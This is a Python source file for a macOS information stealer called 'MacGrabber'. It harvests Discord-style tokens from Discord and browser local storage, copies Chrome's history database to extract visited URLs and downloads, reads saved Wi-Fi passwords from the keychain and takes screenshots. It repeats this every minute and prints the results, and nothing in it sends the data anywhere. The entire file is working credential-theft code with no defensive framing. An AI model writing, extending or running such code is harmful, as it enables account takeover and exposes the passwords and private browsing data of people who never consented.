import os
import re
import base64
import shutil
import sqlite3
import subprocess
import datetime
import traceback
import threading
import time
from queue import Queue
from PIL import ImageGrab

class MacGrabber:
    def __init__(self):
        self.home = os.path.expanduser("~")
        self.roaming = os.path.join(self.home, "Library", "Application Support")
        self.dir = os.path.join(self.home, "mac_grabber_output")
        os.makedirs(self.dir, exist_ok=True)
        self.tokens = set()
        self.exceptions = []
        self.history_data = []
        self.downloads_data = []
        self.misc_data = []
        self.wifi_data = ""
        self.screenshot_path = os.path.join(self.dir, "Screenshot.png")
        self.lock = threading.Lock()

    def decrypt_val(self, buff, master_key):
        try:
            return buff.decode('utf-8', errors='ignore')
        except Exception:
            return ""

    def check_token(self, token):
        with self.lock:
            if token not in self.tokens:
                self.tokens.add(token)

    def grab_tokens(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary', 'Local Storage', 'leveldb'),
            'Lightcord': os.path.join(self.roaming, 'Lightcord', 'Local Storage', 'leveldb'),
            'Discord PTB': os.path.join(self.roaming, 'discordptb', 'Local Storage', 'leveldb'),
            'Chrome': os.path.join(self.home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Local Storage', 'leveldb'),
            'Chrome Beta': os.path.join(self.home, 'Library', 'Application Support', 'Google', 'Chrome Beta', 'Default', 'Local Storage', 'leveldb'),
            'Edge': os.path.join(self.home, 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'Local Storage', 'leveldb'),
            'Brave': os.path.join(self.home, 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser', 'Default', 'Local Storage', 'leveldb'),
            'Chromium': os.path.join(self.home, 'Library', 'Application Support', 'Chromium', 'Default', 'Local Storage', 'leveldb'),
        }
        token_pattern = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}")
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    file_path = os.path.join(path, file_name)
                    with open(file_path, errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                            for token in token_pattern.findall(line):
                                self.check_token(token)
            except Exception:
                with self.lock:
                    self.exceptions.append(traceback.format_exc())

    def grab_history(self):
        self.history_data.clear()
        try:
            path = os.path.join(self.home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
            if not os.path.exists(path):
                return
            temp_db = os.path.join(self.dir, "chrome_history_temp")
            shutil.copy2(path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, typed_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            for url, title, visit_count, typed_count, last_visit_time in cursor.fetchall():
                if url:
                    last_visit = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=last_visit_time)
                    self.history_data.append({
                        'url': url,
                        'title': title,
                        'visit_count': visit_count,
                        'typed_count': typed_count,
                        'last_visit': last_visit.strftime('%Y/%m/%d %H:%M:%S')
                    })
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception:
            with self.lock:
                self.exceptions.append(traceback.format_exc())

    def grab_downloads(self):
        self.downloads_data.clear()
        try:
            path = os.path.join(self.home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
            if not os.path.exists(path):
                return
            temp_db = os.path.join(self.dir, "chrome_history_temp")
            shutil.copy2(path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT current_path, total_bytes, danger_type, tab_url, end_time, original_mime_type, state, opened FROM downloads ORDER BY start_time DESC")
            for (current_path, total_bytes, danger_type, tab_url, end_time, original_mime_type, state, opened) in cursor.fetchall():
                self.downloads_data.append({
                    'current_path': current_path,
                    'total_bytes': total_bytes,
                    'danger_type': danger_type,
                    'tab_url': tab_url,
                    'end_time': end_time,
                    'mime_type': original_mime_type,
                    'state': state,
                    'opened': bool(opened),
                })
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception:
            with self.lock:
                self.exceptions.append(traceback.format_exc())

    def grab_wifi(self):
        try:
            results = subprocess.check_output(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], text=True)
            networks = []
            lines = results.splitlines()
            if len(lines) > 1:
                for line in lines[1:]:
                    parts = line.split()
                    if parts:
                        ssid = parts[0]
                        networks.append(ssid)
            wifi_info = []
            for ssid in networks:
                try:
                    pwd = subprocess.check_output(['security', 'find-generic-password', '-D', 'AirPort network password', '-a', ssid, '-w'], stderr=subprocess.DEVNULL, text=True).strip()
                except subprocess.CalledProcessError:
                    pwd = ""
                wifi_info.append((ssid, pwd))
            out = "Wi-Fi Name                     | Password\n----------------------------------------\n"
            for ssid, pwd in wifi_info:
                out += f"{ssid:<30} | {pwd}\n"
            with self.lock:
                self.wifi_data = out
        except Exception:
            with self.lock:
                self.exceptions.append(traceback.format_exc())

    def screenshot(self):
        try:
            image = ImageGrab.grab()
            image.save(self.screenshot_path)
            image.close()
        except Exception:
            with self.lock:
                self.exceptions.append(traceback.format_exc())

    def run_all(self):
        threads = []
        funcs = [self.grab_tokens, self.grab_history, self.grab_downloads, self.grab_wifi, self.screenshot]
        for f in funcs:
            t = threading.Thread(target=f)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

class OutputListener:
    def __init__(self, grabber):
        self.grabber = grabber
        self.queue = Queue()
        self.running = True

    def start(self):
        threading.Thread(target=self.listen, daemon=True).start()

    def listen(self):
        while self.running:
            time.sleep(3)
            output = []
            with self.grabber.lock:
                if self.grabber.tokens:
                    output.append("=== TOKENS ===")
                    for t in sorted(self.grabber.tokens):
                        output.append(t)
                    output.append("")
                if self.grabber.history_data:
                    output.append("=== BROWSER HISTORY ===")
                    for h in self.grabber.history_data[-10:]:
                        output.append(f"{h['last_visit']} | {h['title']} | {h['url']}")
                    output.append("")
                if self.grabber.downloads_data:
                    output.append("=== DOWNLOADS ===")
                    for d in self.grabber.downloads_data[-5:]:
                        output.append(f"{d['current_path']} | {d['total_bytes']} bytes | {d['tab_url']}")
                    output.append("")
                if self.grabber.wifi_data:
                    output.append("=== WIFI PASSWORDS ===")
                    output.append(self.grabber.wifi_data)
                if self.grabber.exceptions:
                    output.append("=== ERRORS ===")
                    output.append('\n'.join(self.grabber.exceptions[-3:]))
                    output.append("")
            if output:
                print('\n'.join(output), flush=True)

    def stop(self):
        self.running = False

if __name__ == "__main__":
    grabber = MacGrabber()
    listener = OutputListener(grabber)
    listener.start()
    while True:
        grabber.run_all()
        time.sleep(60)
